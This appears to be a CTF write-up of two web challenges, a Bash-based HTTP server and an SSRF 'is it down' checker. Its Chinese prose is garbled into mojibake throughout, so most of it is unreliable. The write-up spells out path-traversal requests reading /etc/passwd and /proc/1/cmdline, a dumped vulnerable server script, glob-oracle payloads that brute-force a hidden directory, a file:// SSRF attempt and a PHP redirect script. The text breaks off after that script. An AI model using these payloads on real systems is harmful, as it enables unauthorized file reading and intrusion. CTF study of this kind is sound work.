æœ‰ç‚¹è¯¡å¼‚ï¼Œä½†æ˜¯å®ƒèƒ½æ­£å¸¸å·¥ä½œï¼æ‰€ä»¥æ²¡é—®é¢˜ï¼Œå¯¹å—ï¼Ÿ å‰ç½®çŸ¥è¯† /procç›®å½•ä»¥åŠå­ç›®å½•çš„åŠŸèƒ½åŠå…¶ä½œç”¨ shellè¯­è¨€ é€šé…ç¬¦ è§£é¢˜æ€è·¯è¿™æ˜¯ä¸€ä¸ªé»‘ç›’æµ‹è¯•ï¼Œç‚¹å‡»é¢˜ç›®é“¾æ¥åå‘ç°å°±ä¸€ä¸ªæŒ‰é’®å¯ä»¥äº¤äº’ ç‚¹å‡»è¿™ä¸ªæŒ‰é’®ï¼Œè·³è½¬åˆ°http://chal-kalmarc.tf:8080/assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpgï¼Œæ²¡ç”¨ä»»ä½•ä¿¡æ¯ã€‚æŸ¥çœ‹åˆå§‹é¡µé¢çš„æºç å‘ç°è¢«éšè—äº†å¦ä¸€ä¸ªæŒ‰é’® !-- a href=assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt\tbuttonGet the flag/button/a -- å†æ¬¡ç‚¹è¿›å»ï¼Œå‘ç°å°±ä¸€å¥è¯ï¼šDid you think it was this easy? Nah, this isnt the flag. ä¹Ÿæ²¡ä»€ä¹ˆå®é™…çš„ä»·å€¼ç‚¹ï¼ˆå…¶å®åé¢è¿™ä¸¤ä¸ªä¸œä¸œä¼šè¢«åˆ©ç”¨åˆ°ï¼‰ï¼Œç„¶åå°±æ˜¯æ— å¤´æ— è„‘çš„ä¸æ–­å°è¯•äº†robots.txtã€æŠ“åŒ…å†å‘åŒ… è¿™ä¸ªè¿‡ç¨‹ä¸­å‘ç°äº†ä¸€ä¸ªæ¯”è¾ƒæœ‰è¶£çš„ï¼Œå“åº”å¤´ä¸­å­˜åœ¨è¿™æ ·ä¸€ä¸ªé”®å€¼ï¼šX-Powered-By: Bashï¼Œshellè¯­è¨€åšåç«¯ï¼Ÿï¼Ÿ å‘ç°éšä¾¿è¾“å…¥ä¸€ä¸ªå†…å®¹åˆ°urlåå¦‚æœä¸å­˜åœ¨ä¼šè¾“å‡ºä¸ºï¼šcat: /app/static/1: No such file or directoryï¼Œå¯ä»¥å¤§èƒ†æ¨æµ‹åç«¯ä¸ºshellè¯­è¨€äº† ç„¶åæˆ‘å°±å¼€å§‹æ€€ç–‘æ˜¯ä¸æ˜¯æœ‰ç›®å½•åˆ›è¶Šçš„æ¼æ´å­˜åœ¨äº†ï¼Œæ‹¦æˆªè¯·æ±‚åŒ…è½¬åˆ°BPè¿›è¡Œæ”¹åŒ…ï¼ˆæµè§ˆå™¨çš„urlä¸­ç›´æ¥è¾“å…¥..ä¼šè¢«åˆ é™¤ï¼Œè€Œå¹¶ä¸ä¼šç›´æ¥ä¼ ä¼šåç«¯ï¼‰å°†urlä¿®æ”¹ä¸º/../../../../../etc/passwd,è¿”å›åŒ…ä¸­å‡ºç°äº†passwdä¸­å¯¹åº”çš„å†…å®¹ é€»è¾‘æ¼æ´1ï¼šå‘ç°ç›®å½•ç©¿è¶Šæ¼æ´ç¡®å®å­˜åœ¨ï¼Œå¯ä»¥å°è¯•ç›´æ¥è¯»ä¸€ä¸‹/flagå‘ç°æ ¹ç›®å½•ä¸‹ä¸å­˜åœ¨flagæ–‡ä»¶ï¼Œé‚£å°±åªèƒ½è¿›/procç›®å½•æ‰¾æ‰¾å¯¹åº”çš„è¿›ç¨‹å’Œè¿è¡Œç›®å½•äº†ï¼Œä¸€èˆ¬è¯»å–1è¿›ç¨‹ï¼ˆä¸€èˆ¬èµ›é¢˜dockerä¸­æœ€åˆçš„çº¿ç¨‹å·ä¸º1ï¼‰å’Œselfè¿›ç¨‹ï¼ˆå½“å‰æŒ‡ä»¤æ‰€å±çš„è¿›ç¨‹ï¼‰ï¼Œä¸€é€šä¹±å°è¯•cmdlineã€environã€statusç­‰ç­‰å‘ç°äº†ä¸€äº›æœ‰ç”¨çš„ä¸œè¥¿ åœ¨/../../../../../proc/1/cmdlineå°è¯•è¯»å–åç«¯çš„è¿è¡Œç¨‹åº HTTP/1.0 200 OKContent-Type: inode/x-emptyX-Powered-By: BashContent-Length: 0Connection: closesocat TCP4-LISTEN:8080,reuseaddr,fork EXEC:/app/badass_server.sh æ­¤æ—¶æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬çš„åç«¯æ‰€å±çš„è„šæœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬å†å°†å®ƒè¯»å–å‡ºæ¥ï¼Œå°è¯•çœ‹çœ‹æºç ä¸­æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚è¯»å–åˆ°çš„æºç ä¸ºï¼š #!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=200 OKabort() declare -gA response_headers\tstatus=400 Bad Request\twrite_headers\tif [ ! -z $1+x ]; then 2 echo Request aborted: $1 echo -en $1\tfi\texit 1write_headers() response_headers[Connection]=close\tresponse_headers[X-Powered-By]=Bash\techo -en HTTP/1.0 $status\\r for key in $!response_headers[@]; do echo -en $key: $response_headers[$key]\\r done\techo -en \\r 2 echo $(date -u +%Y-%m-%dT%H:%M:%SZ) $SOCAT_PEERADDR $method $uri $protocol - $statusreceive_request() read -d $ -a request_line\tif [ $#request_line[@] != 3 ]; then abort Invalid request line\tfi\tmethod=$request_line[0]\turi=$request_line[1]\tprotocol=$(echo -n $request_line[2] | sed s/^\\s*//g | sed s/\\s*$//g)\tif [[ ! $method =~ ^(GET|HEAD)$ ]]; then abort Invalid request method\tfi\tif [[ ! $uri =~ ^/ ]]; then abort Invalid URI\tfi\tif [ $protocol != HTTP/1.0 ] [ $protocol != HTTP/1.1 ]; then abort Invalid protocol\tfi\twhile read -d $ header; do stripped_header=$(echo -n $header | sed s/^\\s*//g | sed s/\\s*$//g) if [ -z $stripped_header ]; then break; fi header_name=$(echo -n $header | cut -d : -f 1 | sed s/^\\s*//g | sed s/\\s*$//g | tr [:upper:] [:lower:]); header_value=$(echo -n $header | cut -d : -f 2- | sed s/^\\s*//g | sed s/\\s*$//g); if [ -z $header_name ] || [[ $header_name =~ [[:space:]] ]]; then abort Invalid header name; fi # If header already exists, add value to comma separated list if [[ -v request_headers[$header_name] ]]; then request_headers[$header_name]=$request_headers[$header_name], $header_value else request_headers[$header_name]=$header_value fi\tdone\tbody_length=$request_headers[content-length]:-0\tif [[ ! $body_length =~ ^[0-9]+$ ]]; then abort Invalid Content-Length\tfi\tread -N $body_length request_bodyhandle_request() # Default: serve from static directory\tpath=/app/static$uri\tpath_last_character=$(echo -n $path | tail -c 1)\tif [ $path_last_character == / ]; then path=$pathindex.html\tfi\tif ! cat $path /dev/null; then status=404 Not Found\telse mime_type=$(file --mime-type -b $path) file_size=$(stat --printf=%s $path) response_headers[Content-Type]=$mime_type response_headers[Content-Length]=$file_size\tfi\twrite_headers\tcat $path 21receive_requesthandle_request ç”±äºæ˜¯shellè¯­è¨€è¿™é‡Œæˆ‘æƒ³åˆ°äº†ä¸€äº›shellä¸­çš„ä¸€äº›éªšæ“ä½œä¾‹å¦‚ï¼š $å˜é‡å #ä¼šå°†å˜é‡çš„å€¼è¿›è¡Œæ‹“å±•å‡ºæ¥$(å‘½ä»¤) #ä¼šæ‰§è¡Œï¼ˆï¼‰ä¸­çš„å‘½ä»¤`å‘½ä»¤` #ä¼šæ‰§è¡Œ` `ä¸­çš„å‘½ä»¤ open , æ‹“å±•ï¼šshellè¯­è¨€ä¸­çš„éƒ¨åˆ†ç‰¹æ€§ ç‰¹æ€§1ï¼šå±•å¼€ æŒ‰ç…§å±•å¼€é¡ºåºåˆ†ä¸ºï¼š èŠ±æ‹¬å·å±•å¼€ï¼ˆBrace Expansionï¼‰ï¼šèŠ±æ‹¬å·å±•å¼€å¯ä»¥ç”¨æ¥ç”Ÿæˆä¸€ç³»åˆ—å…·æœ‰ç›¸ä¼¼ç»“æ„çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨èŠ±æ‹¬å·å±•å¼€å¯ä»¥ç”Ÿæˆä¸€ç»„æ–‡ä»¶åæˆ–è€…ä¸€ç»„å‘½ä»¤å‚æ•°ã€‚ ç¤ºä¾‹ï¼š $ echo a,b,ca b c$ echo file1..3.txtfile1.txt file2.txt file3.txt æ³¢æµªçº¿å±•å¼€ï¼ˆTilde Expansionï¼‰ï¼šæ³¢æµªçº¿å±•å¼€ç”¨äºæ‰©å±•æ³¢æµªçº¿åé¢çš„ç‰¹æ®Šå­—ç¬¦ï¼Œé€šå¸¸ç”¨äºè¡¨ç¤ºç”¨æˆ·çš„ä¸»ç›®å½•è·¯å¾„ã€‚ ç¤ºä¾‹ï¼š $ echo ~/home/username$ echo ~/Documents/home/username/Documents å‚æ•°ï¼Œå˜é‡ï¼Œç®—æœ¯å±•å¼€å’Œå‘½ä»¤æ›¿æ¢ï¼šå‚æ•°å±•å¼€ç”¨äºè®¿é—®è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ï¼Œå˜é‡å±•å¼€ç”¨äºå±•å¼€å˜é‡çš„å€¼ï¼Œç®—æœ¯å±•å¼€ç”¨äºè¿›è¡Œæ•°å­¦è¿ç®—ï¼Œè€Œå‘½ä»¤æ›¿æ¢ç”¨äºå°†å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå±•å¼€ç»“æœã€‚ ç¤ºä¾‹ï¼š $ echo $HOME/home/username$ echo $((2 + 2))$ echo $(ls)file1.txt file2.txt file3.txt å•è¯åˆ†å‰²ï¼ˆWord Splittingï¼‰ï¼šå•è¯åˆ†å‰²ç”¨äºå°†å­—ç¬¦ä¸²æŒ‰ç…§ç‰¹å®šçš„åˆ†éš”ç¬¦è¿›è¡Œæ‹†åˆ†ï¼Œå¸¸è§çš„åˆ†éš”ç¬¦åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ã€‚ ç¤ºä¾‹ï¼š $ string=Hello World$ echo $stringHello World$ for word in $string; do echo $word; doneHelloWorld æ–‡ä»¶åå±•å¼€ï¼ˆFilename Expansionï¼‰ï¼šæ–‡ä»¶åå±•å¼€ç”¨äºåŒ¹é…æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶åæ¨¡å¼ï¼Œå¸¸è§çš„é€šé…ç¬¦åŒ…æ‹¬æ˜Ÿå·ï¼ˆ*ï¼‰å’Œé—®å·ï¼ˆ?ï¼‰ã€‚ ç¤ºä¾‹ï¼š $ ls *.txtfile1.txt file2.txt file3.txt$ rm file?.txt ç‰¹æ€§2ï¼šå•åŒå¼•å·çš„åŒºåˆ« å•å¼•å·ï¼š ä½¿ç”¨å•å¼•å·ï¼Œå•å¼•å·ä¸­çš„å†…å®¹ä¸€å¾‹è¢«è§†ä¸ºå­—ç¬¦ä¸²ï¼Œä¸è¿›è¡Œè½¬ä¹‰ï¼Œæ— æ³•è¢«æ‰©å±•ï¼Œ${}ã€$()ã€åå¼•å·ã€é€šé…ç¬¦æ— æ³•è¢«ä½¿ç”¨ ä¾‹å¦‚ï¼š root@ubuntu:/home/ubuntu/Desktop# echo /*/app /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /swapfile /sys /tmp /usr /var#é€šé…ç¬¦ä¸ä¼šå±•å¼€root@ubuntu:/home/ubuntu/Desktop# echo /*/*root@ubuntu:/home/ubuntu/Desktop# echo $(date)$(date) åŒå¼•å·ï¼š å˜é‡å±•å¼€ï¼šåŒå¼•å·å†…çš„å˜é‡ä¼šè¢«å±•å¼€ï¼Œå³å˜é‡çš„å€¼ä¼šæ›¿æ¢å˜é‡æœ¬èº«ã€‚ å‘½ä»¤æ›¿æ¢ï¼šåŒå¼•å·å†…çš„å‘½ä»¤æ›¿æ¢ï¼ˆä½¿ç”¨$()æˆ–åå¼•å·ï¼‰ä¼šè¢«æ‰§è¡Œï¼Œå…¶è¾“å‡ºä¼šæ›¿æ¢å‘½ä»¤æœ¬èº«ã€‚ é€šé…ç¬¦ä¸ä¼šå±•å¼€ï¼šåŒå¼•å·å†…çš„é€šé…ç¬¦ï¼ˆå¦‚*ã€?ç­‰ï¼‰ä¸ä¼šè¢«ä½œä¸ºé€šé…ç¬¦å¤„ç†ï¼Œè€Œæ˜¯ä½œä¸ºæ™®é€šå­—ç¬¦ã€‚ è½¬ä¹‰å­—ç¬¦ï¼šæŸäº›ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚$ã€åå¼•å·ã€\\ï¼‰å¯ä»¥é€šè¿‡åæ–œçº¿è¿›è¡Œè½¬ä¹‰ä»¥è¡¨ç¤ºå…¶å­—é¢æ„ä¹‰ã€‚ ä¾‹å¦‚ï¼š #å˜é‡å±•å¼€root@ubuntu:/home/ubuntu/Desktop# path=*root@ubuntu:/home/ubuntu/Desktop# echo $path*#å‘½ä»¤æ›¿æ¢root@ubuntu:/home/ubuntu/Desktop# echo $(date)2024å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸæ—¥ 16:55:37 CST#é€šé…ç¬¦ä¸ä¼šå±•å¼€root@ubuntu:/home/ubuntu/Desktop# echo ** ç‰¹æ€§3ï¼šå˜é‡å±•å¼€åçš„å­—ç¬¦ä¸² 1.è¿›è¡Œå˜é‡å±•å¼€åï¼Œé€šé…ç¬¦ä¸å— å±•å¼€å‰å•åŒå¼•å·æ€§è´¨çš„å½±å“ â€‹\tåªè¦æœ€åä½¿ç”¨å˜é‡æ—¶ï¼Œæœ€å¤–å±‚ä¸å­˜åœ¨å³å¯å±•å¼€ ä¾‹å¦‚ #test1path=*path_after=./*echo $path_after #å˜é‡æ›¿æ¢åï¼Œæœ€å¤–å±‚ä¹Ÿæ— çš„å½±å“ï¼Œæ­¤æ—¶é€šé…ç¬¦*å¯è¢«å±•å¼€#è¾“å‡ºç»“æœï¼š./badass_server.sh ./character1.sh ./character2.sh#test2path=*path_after=./$pathecho â€$path_afterâ€œ #å˜é‡æ›¿æ¢åï¼Œæœ€å¤–å±‚å­˜åœ¨çš„å½±å“ï¼Œé€šé…ç¬¦æ— æ³•å±•å¼€#è¾“å‡ºç»“æœï¼š ./* 2.è¿›è¡Œå˜é‡å±•å¼€åï¼Œå˜é‡å±•å¼€ã€å‘½ä»¤æ›¿æ¢å—æœ€å¼€å§‹èµ‹å€¼æ—¶çš„å•åŒå¼•å·å½±å“ â€‹\tè‹¥æœ€å¼€å§‹æ—¶ä½¿ç”¨å•å¼•å·ï¼Œæ— è®ºæœ€åä½¿ç”¨å˜é‡æ—¶ï¼Œæœ€å¤–å±‚å­˜ä¸å­˜åœ¨å¼•å·ï¼Œéƒ½æ— æ³•è¢«å±•å¼€ ä¾‹å¦‚ï¼š #test1path=$(date)path_after=./$pathecho $path_afterpath_after_after=$path_afterecho $path_after_after# è¾“å‡ºç»“æœï¼š# ./$(date)# ./$(date)#test2data= dateecho $datapath=$datapath_after=./$pathecho $path_afterpath_after_after=$path_afterecho $path_after_after# è¾“å‡ºç»“æœï¼š# Sun Mar 24 21:29:51 2024# ./$data# ./$data ä½†ç»è¿‡å°è¯•ï¼Œå‘ç°æ— æ³•é€šè¿‡æ§åˆ¶$pathè¿™ä¸ªå€¼å˜ä¸º$ä½¿æœ€åçš„catè¿”å›å‘½ä»¤æ›¿æ¢çš„ç»“æœ é¢„æƒ³ç»“æœï¼ˆå¯ä»¥é€šè¿‡catçš„æŠ¥é”™è·å–ä¿¡æ¯ï¼Œå¦‚æœè¿™ç§åŠæ³•å¯è¡Œå‰©ä¸‹çš„åªæ˜¯ç©ºæ ¼çš„ç»•è¿‡ï¼‰ï¼š root@ubuntu:/home/ubuntu/Desktop# url=$(ls)root@ubuntu:/home/ubuntu/Desktop# path=app/static/$urlroot@ubuntu:/home/ubuntu/Desktop# cat $pathcat: app/static/1.sh$ 2: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• å®é™…ç»“æœ open , æ‹“å±•ï¼šshellè¯­è¨€ä¸­çš„éƒ¨åˆ†ç‰¹æ€§ ç‰¹æ€§4ï¼šreadå‘½ä»¤å¤„ç†å­—ç¬¦ä¸² ä½¿ç”¨readå‘½ä»¤æ¥è¯»å–è¾“å…¥çš„å­—ç¬¦ä¸²æ—¶ï¼Œæ‰€è¯»å–çš„å­—ç¬¦ä¸²ç›¸å½“äºè¢«å•å¼•å·åŒ…å›´ï¼Œå…·æœ‰å•å¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²çš„ç‰¹ç‚¹ å˜é‡ä¸å±•å¼€ï¼šå•å¼•å·å†…çš„å†…å®¹éƒ½ä¼šè¢«å½“ä½œæ™®é€šå­—ç¬¦ä¸²å¤„ç†ï¼ŒåŒ…æ‹¬å˜é‡ï¼Œå®ƒä»¬ä¸ä¼šè¢«å±•å¼€ã€‚ å‘½ä»¤ä¸æ›¿æ¢ï¼šå•å¼•å·å†…çš„å‘½ä»¤ä¸ä¼šè¢«æ‰§è¡Œï¼Œå³ä½¿ä½¿ç”¨$()æˆ–åå¼•å·ã€‚ é€šé…ç¬¦ä¸å±•å¼€ï¼šå•å¼•å·å†…çš„é€šé…ç¬¦åŒæ ·ä¸ä¼šè¢«å±•å¼€ï¼Œè¢«è§†ä¸ºæ™®é€šæ–‡æœ¬ã€‚ è½¬ä¹‰å­—ç¬¦ä¸å·¥ä½œï¼šå•å¼•å·å†…å‡ ä¹æ‰€æœ‰çš„å­—ç¬¦éƒ½è¢«è§†ä¸ºæ™®é€šå­—ç¬¦ï¼ŒåŒ…æ‹¬åæ–œçº¿ï¼ˆ\\ï¼‰ï¼Œå®ƒä¸å…·æœ‰è½¬ä¹‰åŠŸèƒ½ã€‚ ä¾‹å¦‚ï¼š #test1read -d $ -a request_linemethod=$request_line[0]echo $method#è¾“å…¥ï¼š$(ls) $(ls) $(ls)#è¾“å‡ºï¼š$(ls)#test2request_line=($(ls) $(ls))method=$request_line[0]echo $method#è¾“å‡ºï¼šbadass_server.sh bash.md æ­¤æ—¶å‘ç°æˆ‘ä»¬å¯æ§ç‚¹åªå‰©ä¸‹$protocolå˜é‡ protocol=$(echo -n $request_line[2] | sed s/^\\s*//g | sed s/\\s*$//g) if [ $protocol != HTTP/1.0 ] [ $protocol != HTTP/1.1 ]; then\tabort Invalid protocolfi é€»è¾‘æ¼æ´2ï¼šå¯æ§åŸå› ï¼š$protocolå˜é‡ç”±äºä½¿ç”¨echoå‘½ä»¤ï¼Œæ˜¯å¾—readè¯»å–åçš„ç‰¹æ€§æ¶ˆå¤±ï¼Œä½¿å¾—$protocolå¯è¢«æ‹“å±• å½“æˆ‘ä»¬å°è¯•ä¿®æ”¹HTTP/1.1ä¸º/*æ—¶ï¼Œå‘ç°å¹¶æ²¡æœ‰å‡ºç°Invalid protocol open , æ‹“å±•ï¼šshellè¯­è¨€ä¸­çš„éƒ¨åˆ†ç‰¹æ€§ ç‰¹æ€§4ï¼š[]çš„è¿”å›å€¼ åœ¨ shell ä¸­ï¼Œ[] ç¬¦å·é€šå¸¸ç”¨äºæ¡ä»¶æµ‹è¯•ã€‚å¦‚ if [ CONDITION ]; then ... è¿™æ ·çš„è¯­å¥ã€‚åœ¨è¿™ç§ç”¨æ³•ä¸­ï¼Œ[] æ˜¯ [ å‘½ä»¤çš„ç®€å†™ï¼Œè¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªæŒ‡å‘ test å‘½ä»¤çš„é“¾æ¥ã€‚å› æ­¤ï¼Œå½“ä½ ä½¿ç”¨ [] æ—¶ï¼Œå®é™…ä¸Šæ˜¯åœ¨è°ƒç”¨ test å‘½ä»¤æ¥è¯„ä¼°ä¸€ä¸ªæ¡ä»¶ã€‚ test å‘½ä»¤ï¼ˆæˆ–å…¶ç­‰ä»·çš„ [ å½¢å¼ï¼‰çš„è¿”å›å€¼éµå¾ª shell å‘½ä»¤çš„é€šç”¨è¿”å›å€¼çº¦å®šï¼š 0ï¼šè¡¨ç¤ºæµ‹è¯•çš„æ¡ä»¶ä¸ºçœŸï¼ˆtrueï¼‰ã€‚ 1ï¼šè¡¨ç¤ºæµ‹è¯•çš„æ¡ä»¶ä¸ºå‡ï¼ˆfalseï¼‰ã€‚ã€‚ 1ï¼šå¦‚æœå‡ºç°é”™è¯¯ï¼Œå¦‚è¯­æ³•é”™è¯¯æˆ–ä½¿ç”¨äº†æ— æ•ˆçš„é€‰é¡¹ï¼Œtest å‘½ä»¤å¯èƒ½ä¼šè¿”å›å¤§äº 1 çš„å€¼ã€‚æ¯”è¾ƒç‰¹åˆ«çš„æ˜¯ï¼Œæ­¤æ—¶å³ä½¿è®¾ç½®äº†set -eä¹Ÿä¸ä¼šé€€å‡ºç¨‹åº é€»è¾‘æ¼æ´3ï¼šå°†HTTP/1.1æ›¿æ¢ä¸º/*æ—¶ï¼Œç”±äºé€šé…ç¬¦å±•å¼€ï¼Œæœ€åä¼šå‡ºç°è¿›è¡ŒåŒ¹é…é”™è¯¯ï¼Œ[]è¿”å›å¤§äº1çš„ç»“æœï¼Œçš„ä¸¤ä¾§ç»“æœéƒ½æ˜¯å¤§äº0ï¼Œè¿”å›1ï¼Œå› æ­¤è®¤ä¸ºæ˜¯å‡ï¼Œæ­¤æ—¶è¿™ä¸ªifæ¡ä»¶è¢«åˆ¤å®šä¸ºå‡ï¼Œå¯ä»¥ç»§ç»­æ‰§è¡Œåé¢å†…å®¹çš„ä»£ç  ä½†å¦‚æœ/*åŒ¹é…åˆ°çš„ç»“æœåªæœ‰ä¸€ä¸ªæ—¶ï¼Œå¹¶ä¸ä¼šé€ æˆåŒ¹é…é”™è¯¯ï¼Œè€Œç›´æ¥è¿”å›0ï¼Œçš„ä»»æ„ä¸€ä¾§ç»“æœä¸º0ä¼šç›´æ¥è¿”å›0ï¼Œæ­¤æ—¶è¿™ä¸ªifæ¡ä»¶è¢«åˆ¤å®šä¸ºçœŸ å¯åŠ¨set -xæ—¶çš„è¯¦ç»†ä¿¡æ¯å¦‚ä¸‹ + [ badass_server.sh bash.md character1.sh character2.sh file != HTTP/1.0 ]./badass_server.sh: line 63: [: too many arguments æ³¨æ„ï¼šæ­¤æ—¶é€šé…ç¬¦å±•å¼€å¹¶ä¸èƒ½è®¤ä¸ºè¿™ä¸ªå˜é‡æ˜¯æ•°ç»„ï¼Œæ•°ç»„ç›´æ¥ä½¿ç”¨ä¼šåˆ©ç”¨æ•°ç»„ç¬¬0ä¸ªè¿›è¡ŒåŒ¹é…ï¼Œè€Œé€šé…ç¬¦å±•å¼€ä¼šæŠ¥é”™ å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªç‚¹ï¼Œä½¿ç”¨globé€šé…ç¬¦[]å†™å…¥ä¸€ä¸ªå·²çŸ¥çš„å­—ç¬¦ï¼Œä¸æ–­ä¿®æ”¹å­—ç¬¦ï¼Œä½¿å…¶æœ€åèƒ½åŒ¹é…åˆ°çš„ç»“æœæœ€åæœ‰1ä¸ªä»¥ä¸Šï¼Œé¡µé¢ä¸å‡ºç°ï¼šInvalid protocolï¼Œè¿›è¡Œå¯¹ç›®å½•æˆ–è€…æ–‡ä»¶åçš„ä¸€æ­¥ä¸€æ­¥åŒ¹é…ï¼ˆç”¨è¿™ç§æ–¹æ³•å¯ä»¥ç¡®å®šåç§°æ¯”å·²çŸ¥ç›®å½•å°‘çš„ç›®å½•åï¼‰ æœ€åˆçš„é¡µé¢ç»™å‡ºäº†ä¸¤ä¸ªç›®å½•ï¼Œéœ€è¦åˆ©ç”¨è¿™ä¸¤ä¸ªç›®å½•ï¼Œé€‰æ‹©ä¸€ä¸ªç›®å½•ä½œä¸ºå·²çŸ¥å­—ç¬¦ a href=assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg\tbuttonExplore the iceberg/button/a!-- a href=assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt\tbuttonGet the flag/button/a -- ä»¥26c3f25922f71af3372ac65a75cd3b11ä½œä¸ºå·²çŸ¥å­—ç¬¦ä¸ºä¾‹ï¼Œæ‰€ä»¥æœ€åçš„playloadçš„è¿‡ç¨‹ä¸ºï¼š GET /../../../../../../etc/passwd /app/static/assets/[29]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d][cf]*........ æœ€åæ‰¾åˆ°éšè—çš„ç›®å½•ï¼Œ 9df5256fe48859c91122cb92964dbd66 ä¼°è®¡æœ€åæ˜¯çŒœçš„å§ï¼Œflagæœ€åçš„ä½ç½®æ˜¯ï¼š/app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt ä¿®æ”¹urlä¸º../../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txtè¯»å‡ºkalmar17b29adf_bash_web_server_was_a_mistake_374add33 Is It Downå®ƒæ˜¯å¦å®•æœº é¢˜ç›®æè¿° In an increasingly online world it is nice to know, if you are the only one being offline or if everybody else are having offline too. åœ¨ä¸€ä¸ªæ—¥ç›Šåœ¨çº¿åŒ–çš„ä¸–ç•Œä¸­ï¼Œäº†è§£è‡ªå·±æ˜¯å”¯ä¸€ç¦»çº¿è¿˜æ˜¯å…¶ä»–äººä¹Ÿå¤„äºç¦»çº¿çŠ¶æ€æ˜¯å¾ˆé‡è¦çš„ã€‚ We present to you: Is it down! æˆ‘ä»¬å‘æ‚¨ä»‹ç»ï¼šå®ƒæ˜¯å¦å®•æœºï¼ Rumour has it, that a flag is stored somewhere on this server. æœ‰ä¼ è¨€ç§°ï¼Œä¸€ä¸ªæ ‡å¿—ä½è¢«å­˜å‚¨åœ¨è¿™å°æœåŠ¡å™¨çš„æŸä¸ªåœ°æ–¹ã€‚ å‰ç½®çŸ¥è¯† /procç›®å½•ä»¥åŠå­ç›®å½•çš„åŠŸèƒ½åŠå…¶ä½œç”¨ Pythonè¯­è¨€åŠç‰¹æ€§ __pycache__æ–‡ä»¶å¤¹ è§£é¢˜æ€è·¯åŒæ ·çš„è¿™ä¹Ÿæ˜¯ä¸€ä¸ªé»‘ç›’æµ‹è¯•ï¼Œçœ‹äº†çœ‹é¡µé¢å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆæç¤ºï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„è¾“å…¥çš„ç½‘å€è¿›è¡Œåˆ¤æ–­ï¼Œç½‘å€æ˜¯å¦åœ¨çº¿æˆ–è€…ç¦»çº¿ ç›´æ¥æŠ“åŒ…ç„¶årepeatçœ‹çœ‹ ä¼šå‘ç°é¡µé¢å‡ºç°äº†æˆ‘ä»¬è¾“å…¥ç½‘é¡µçš„æºä»£ç ï¼Œç›¸å…³çš„æ¼æ´åº”è¯¥å°±æ˜¯SSRF å°è¯•ç›´æ¥ä½¿ç”¨file:///etc/passwdè¯•è¯•çœ‹ï¼Œå‘ç°é¡µé¢å›æ˜¾å‡ºäº† error:Url must start with https://. We do not want anything insecure here!,success:false å‘ç°åªèƒ½ä½¿ç”¨https://å¼€å¤´çš„é“¾æ¥ï¼ˆæ˜¯æˆ‘åº”è¯¥å°±åœ¨è¿™å¡ä½äº†ï¼‰ æ ¹æ®å¤§ä½¬çš„æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸ªå‘ç”Ÿé‡å®šå‘çš„ç½‘å€ï¼Œ æ— è¯­å•¦ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚å¥½éº»çƒ¦ï¼Œè¿˜å¾—è‡ªå·±èµ·ä¸ªhttpsæœåŠ¡ æ ¹æ®å®é™…çš„æµ‹è¯•å‘ç°ï¼š å¦‚æœè¾“å…¥çš„é“¾æ¥ç½‘é¡µå­˜åœ¨ä»»ä½•å†…å®¹ï¼Œä¸ä¼šè·Ÿéšç€ç½‘é¡µé‡å®šå‘ å¦‚æœè¾“å…¥çš„é“¾æ¥ç½‘é¡µä¸å­˜åœ¨ä»»ä½•å†…å®¹ï¼Œæ­¤æ—¶ä¼šè·Ÿéšç€ç½‘é¡µé‡å®šå‘ ä¾‹å¦‚ï¼š æˆ‘ä»¬è¾“å…¥ç½‘å€çš„å“åº”åŒ…ä¸ºï¼š HTTP/1.1 301 Moved PermanentlyServer: nginxDate: Sun, 24 Mar 2024 15:00:50 GMTContent-Type: text/htmlContent-Length: 162Connection: closeLocation: https://t.doruo.cn/14Qqfhjr2htmlheadtitle301 Moved Permanently/title/headbodycenterh1301 Moved Permanently/h1/centerhrcenternginx/center/body/html æ­¤æ—¶ï¼Œä¸è·Ÿéšé‡å®šå‘ï¼Œè¿”å›çš„å†…å®¹ä¸º content:html\\\\r\\ headtitle301 Moved Permanently/title/head\\\\r\\ body bgcolor=\\white\\\\\\r\\ centerh1301 Moved Permanently/h1/center\\\\r\\ hrcenteropenresty/center\\\\r\\ /body\\\\r\\ /html\\\\r\\ ,online:true,success:true æˆ‘ä»¬è‡ªå·±èµ·ä¸€ä¸ªåç«¯æœåŠ¡ï¼Œä¸ºäº†éšæ—¶æ›´æ”¹é‡å®šå‘å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®ä»£ç ä¸ºä»¥ä¸‹ ?phperror_reporting(0);header(Location: .$_GET[wells]); 